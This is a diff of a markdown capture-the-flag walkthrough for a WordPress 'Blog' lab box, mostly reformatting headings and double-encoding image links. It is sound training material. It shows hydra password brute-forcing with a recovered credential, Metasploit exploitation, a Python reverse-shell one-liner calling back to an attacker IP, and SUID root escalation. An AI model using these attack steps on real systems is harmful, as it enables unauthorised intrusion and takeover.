@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1f4d6
 ---
+# ENUMERATION
+---
 
-# BLOG
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE         |
-| ---- | --------------- |
+| :--- | :-------------- |
 | 20   | SSH             |
 | 80   | HTTP            |
 | 139  | NETBIOS-SSN SMB |
@@ -84,11 +82,13 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 ```
 
-## RECONNAISSANCE
 
-***
+# RECONNAISSANCE
+---
 
 We can see that `smb` is enabled in the system, let's try to search if the anonymous login is enabled:
+
+
 
 ```
 smbclient -L \\\\10.10.62.71\\ -N
@@ -117,17 +117,20 @@ smb: \> ls
 
 The `check-this.png` file contains a QR code which simply takes us to a Youtube video, in the `Alice-White-Rabbit.jpg`, we can extract the hidden data, it gives us a `rabbit_hole.txt` file, which says this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327173926.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327173926.png)
 
 The `tswift.mp4` file does not contain anything, seems like the SMB is not useful for now, let's proceed to the web application, if we remember, `robots.txt` entrance is allowed:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327174241.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327174241.png)
+
+
 
 If we try to go to `/wp-admin/`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327174317.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327174317.png)
 
 We need to add `blog.thm` to `/etc/hosts`:
+
 
 ```bash
 echo 'IP blog.thm' | sudo tee -a /etc/hosts
@@ -201,13 +204,14 @@ curl http://blog.thm/wp-json/wp/v2/users -s | jq | grep slug
     "slug": "kwheel",
 ```
 
+
 We got two users, what about trying to bruteforce with hydra:
 
 ```
 hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=kwheel&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250327183359.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250327183359.png)
 
 We got it:
 
@@ -215,19 +219,24 @@ We got it:
 kwheel:cutiepie1
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250328145550.png)
 
-## EXPLOITATION
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328145550.png)
 
-***
 
-We got the login, we can search for an exploit regarding the `wordpress 5.0`
+# EXPLOITATION
+---
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250328145750.png)
+We got the login, we can search for an exploit regarding the `wordpress 5.0` 
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250328150658.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328145750.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328150658.png)
+
+
 
 Let's use these options in order to get the shell in `metasploit`:
+
 
 ```
 set username kwheel
@@ -239,7 +248,7 @@ exploit
 
 After we send the exploit, we get a `meterpreter` session:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250328150952.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328150952.png)
 
 We can migrate into netcat for a more comfortable shell or stay in meterpreter, I decided to migrate just for run:
 
@@ -249,9 +258,10 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",9001));os.dup
 
 Let's proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 If we migrated to netcat we can stabilize our shell:
 
@@ -265,7 +275,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-We can begin by checking the `SUID 4000` binaries
+We can begin by checking the `SUID 4000` binaries  
 
 ```
 find / -perm -4000 2>/dev/null
@@ -273,7 +283,7 @@ find / -perm -4000 2>/dev/null
 
 We can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250328152927.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328152927.png)
 
 There's something unusual, a binary called `/usr/sbin/checker`, let's check it out:
 
@@ -285,9 +295,10 @@ puts("Not an Admin"Not an Admin
 +++ exited (status 0) +++
 ```
 
-* The binary checks for the environment variable `admin` using `getenv("admin")`.
-* If `admin` is not set (`nil`), it prints `"Not an Admin"` and exits.
-* **Goal**: Trick the binary into thinking `admin` is set to trigger privileged code (likely a root shell or action).
+- The binary checks for the environment variable `admin` using `getenv("admin")`.
+- If `admin` is not set (`nil`), it prints `"Not an Admin"` and exits.
+- **Goal**: Trick the binary into thinking `admin` is set to trigger privileged code (likely a root shell or action).
+
 
 We can do the following in order to get a root shell:
 
@@ -295,7 +306,7 @@ We can do the following in order to get a root shell:
 admin=1 /usr/sbin/checker /bin/sh
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250328153450.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250328153450.png)
 
 Let's try reading flags:
 
